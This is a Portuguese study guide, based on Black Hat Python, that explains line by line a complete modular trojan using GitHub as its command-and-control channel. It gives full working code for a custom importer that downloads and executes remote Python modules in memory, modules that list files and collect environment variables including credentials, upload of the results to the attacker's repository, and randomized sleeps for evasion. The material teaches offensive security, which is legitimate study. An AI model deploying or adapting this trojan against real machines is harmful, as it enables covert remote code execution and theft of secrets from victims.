# Capítulo 7 — GitHub Command and Control

> Baseado em *Black Hat Python, 2ª Edição* (Justin Seitz & Tim Arnold, No Starch Press, 2021).

## Visão geral

O objetivo é criar um **trojan modular** que usa o GitHub como canal de comando e controle (C2). O trojan:

1. Autentica no GitHub via token pessoal.
2. Baixa um arquivo de configuração (`config/<id>.json`) que lista quais módulos executar.
3. Baixa dinamicamente o código-fonte dos módulos (`modules/<nome>.py`) do repositório.
4. Executa cada módulo em uma thread separada.
5. Envia os resultados de volta ao repositório (`data/<id>/<timestamp>.data`).
6. Dorme um tempo aleatório (30 min a 3 h) e repete.

A grande sacada é o **hack no sistema de importação do Python**: quando o trojan tenta `import keylogger`, o Python não encontra o módulo localmente, então chama nosso `GitImporter`, que baixa o `.py` do GitHub e o carrega em memória.

---

## 7.1 — Módulo `dirlister.py`

**Arquivo:** `modules/dirlister.py`
**Função:** Lista os arquivos do diretório atual.

```python
import os


def run(**args):
    print("[*] In dirlister module.")
    files = os.listdir(".")
    return str(files)
```

### Explicação linha a linha

| Linha | Código | Explicação |
|-------|--------|------------|
| 1 | `import os` | Necessário para `os.listdir()`. |
| 4 | `def run(**args):` | Assinatura padrão de todo módulo do trojan. `**args` aceita argumentos nomeados arbitrários (customizáveis via JSON). |
| 5 | `print("[*] In dirlister module.")` | Log de debug. |
| 6 | `files = os.listdir(".")` | Lista arquivos e diretórios do diretório atual. |
| 7 | `return str(files)` | Converte para string (serializável) e retorna. |

---

## 7.2 — Módulo `environment.py`

**Arquivo:** `modules/environment.py`
**Função:** Coleta todas as variáveis de ambiente da máquina vítima.

```python
import os


def run(**args):
    print("[*] In environment module.")
    return os.environ
```

### Explicação linha a linha

| Linha | Código | Explicação |
|-------|--------|------------|
| 1 | `import os` | Para acessar `os.environ`. |
| 4 | `def run(**args):` | Assinatura padrão. |
| 5 | `print("[*] In environment module.")` | Log. |
| 6 | `return os.environ` | Retorna dicionário com todas as variáveis de ambiente (pode conter credenciais, tokens, paths). |

---

## 7.3 — Configuração `abc.json`

**Arquivo:** `config/abc.json`
**Função:** Lista os módulos que o trojan deve executar.

```json
[
    {
        "module": "dirlister"
    },
    {
        "module": "environment"
    }
]
```

### Explicação

Lista de objetos JSON. Cada objeto tem a chave `"module"` com o nome do módulo a ser importado dinamicamente. O trojan baixa este arquivo, decodifica de base64 e itera sobre a lista.

---

## 7.4 — Trojan principal `git_trojan.py`

**Arquivo:** `git_trojan.py`
**Função:** O trojan em si. Conecta ao GitHub, baixa config e módulos, executa e envia resultados.

```python
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'tianro'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhtprojan')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(
            remote_path, message, base64.b64encode(bindata)
        )

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_module(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
```

### Explicação linha a linha

#### Imports
| Linha | Código | Explicação |
|-------|--------|------------|
| 1 | `import base64` | Codifica/decodifica dados em base64 (GitHub usa esse formato). |
| 2 | `import github3` | Biblioteca de interação com a API do GitHub. |
| 3 | `import importlib` | Cria objetos de módulo dinamicamente. |
| 4 | `import json` | Interpreta o arquivo de configuração. |
| 5 | `import random` | Gera sleeps aleatórios (evasão). |
| 6 | `import sys` | Manipula `sys.modules` e `sys.meta_path`. |
| 7 | `import threading` | Executa módulos em threads paralelas. |
| 8 | `import time` | Sleeps e timestamps. |
| 10 | `from datetime import datetime` | Timestamp para nomear arquivos de resultado. |

#### `github_connect()`
| Linha | Código | Explicação |
|-------|--------|------------|
| 14 | `with open('mytoken.txt') as f:` | Abre o arquivo com o token pessoal do GitHub. |
| 15 | `token = f.read()` | Lê o token. |
| 16 | `user = 'tianro'` | Nome de usuário (substitua pelo seu). |
| 17 | `sess = github3.login(token=token)` | Autentica na API. |
| 18 | `return sess.repository(user, 'bhtprojan')` | Retorna o objeto do repositório. |

#### `get_file_contents()`
| Linha | Código | Explicação |
|-------|--------|------------|
| 21 | `return repo.file_contents(f'{dirname}/{module_name}').content` | Baixa o conteúdo (base64) de um arquivo do repo. |

#### Classe `Trojan`

**`__init__`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 26 | `self.id = id` | ID único do trojan (ex.: `'abc'`). |
| 27 | `self.config_file = f'{id}.json'` | Nome do arquivo de configuração. |
| 28 | `self.data_path = f'data/{id}/'` | Diretório remoto de resultados. |
| 29 | `self.repo = github_connect()` | Conexão com o GitHub. |

**`get_config()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 32-34 | `config_json = get_file_contents(...)` | Baixa o config do GitHub. |
| 35 | `config = json.loads(base64.b64decode(config_json))` | Decodifica de base64 e converte para dict. |
| 36-38 | `for task in config: ... exec("import %s" % task['module'])` | Força a importação de cada módulo (aciona o `GitImporter`). |

**`module_runner()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 41 | `result = sys.modules[module].run()` | Chama `run()` do módulo importado. |
| 42 | `self.store_module_result(result)` | Envia o resultado ao GitHub. |

**`store_module_result()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 45 | `message = datetime.now().isoformat()` | Timestamp ISO. |
| 46 | `remote_path = f'data/{self.id}/{message}.data'` | Caminho remoto. |
| 47 | `bindata = bytes('%r' % data, 'utf-8')` | Converte resultado para bytes. |
| 48-50 | `self.repo.create_file(remote_path, message, base64.b64encode(bindata))` | Cria o arquivo no repo. |

**`run()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 53 | `while True:` | Loop infinito. |
| 54 | `config = self.get_config()` | Recarrega config. |
| 55-59 | `for task in config: ... thread.start()` | Executa cada módulo em thread. |
| 59 | `time.sleep(random.randint(1, 10))` | Atraso aleatório entre execuções. |
| 60 | `time.sleep(random.randint(30*60, 3*60*60))` | Espera 30 min a 3 h antes de recarregar. |

#### Classe `GitImporter`

Implementa o protocolo de importação do Python (PEP 302).

| Linha | Código | Explicação |
|-------|--------|------------|
| 64 | `def __init__(self):` | Inicializa atributo do código-fonte. |
| 67 | `def find_module(self, name, path=None):` | Chamado quando um módulo não é encontrado localmente. |
| 68 | `print(...)` | Log. |
| 69 | `self.repo = github_connect()` | Reconecta ao GitHub. |
| 70-71 | `new_library = get_file_contents(...)` | Baixa o `.py` do repo. |
| 72-74 | `if new_library is not None: ... return self` | Decodifica e retorna `self` para que `load_module` seja chamado. |
| 76 | `def load_module(self, name):` | Cria e registra o módulo. |
| 77-79 | `spec = importlib.util.spec_from_module(...)` | Cria spec do módulo. |
| 80 | `new_module = importlib.util.module_from_spec(spec)` | Cria objeto de módulo vazio. |
| 81 | `exec(self.current_module_code, new_module.__dict__)` | Executa o código remoto no namespace do novo módulo. |
| 82 | `sys.modules[spec.name] = new_module` | Registra em `sys.modules`. |
| 83 | `return new_module` | Retorna o módulo. |

#### Bloco `__main__`
| Linha | Código | Explicação |
|-------|--------|------------|
| 86 | `sys.meta_path.append(GitImporter())` | Registra o importador customizado. |
| 87 | `trojan = Trojan('abc')` | Cria o trojan com ID `'abc'`. |
| 88 | `trojan.run()` | Inicia o loop. |

---

## Estrutura do repositório GitHub

```
bhtprojan/
├── .gitignore          # ignora mytoken.txt
├── config/
│   └── abc.json        # lista de módulos a executar
├── modules/
│   ├── dirlister.py
│   └── environment.py
└── data/
    └── abc/            # resultados enviados pelo trojan
```

## Comandos para criar o repo

```bash
$ mkdir bhtprojan && cd bhtprojan
$ git init
$ mkdir modules config data
$ touch .gitignore
$ git add .
$ git commit -m "Adds repo structure for trojan."
$ git remote add origin https://github.com/<seu-usuario>/bhtprojan.git
$ git push origin master
```

## Observações importantes

- **`mytoken.txt`** deve ser adicionado ao `.gitignore` para não vazar o token.
- O token precisa ter permissões de **leitura e escrita** no repositório.
- Em versões do Python **3.12+**, os métodos `find_module`/`load_module` foram removidos. É necessário usar `find_spec`/`exec_module` (veja o tutorial de integração para a versão modernizada).
- Em versões recentes do `github3.py`, o método `create_file` pode esperar conteúdo **não** codificado em base64. Ajuste conforme necessário.